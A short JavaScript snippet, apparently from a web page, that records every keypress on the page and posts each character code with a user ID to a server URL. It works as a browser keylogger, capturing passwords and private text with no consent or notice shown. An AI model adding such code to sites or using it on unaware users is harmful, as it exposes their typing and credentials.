// var record_keys = [];



function record_recordInput(event, eventType) {
  var eventData;
  if (eventType === "keypress") {
    eventData = event.charCode;
  }
  var postData = {
    "targetID": user_id,
    "eventType": eventType,
    "data": eventData,
  };
  var onError = function(err) {
    debugger
    console.log('err');
    console.log(err);
  };
  var onSuccess = function(e) {
    console.log(e);
  }
  // $.ajax({
  //   type: 'POST',
  //   url: post_url,
  //   data: postData,
  //   error: onError,
  //   success: onSuccess
  // });
  $.post(post_url, postData);
}


function record_trackKeys() {
  console.log('recording');
  document.onkeypress = function(e) {
    record_recordInput(e, 'keypress');
  };
}

record_trackKeys();
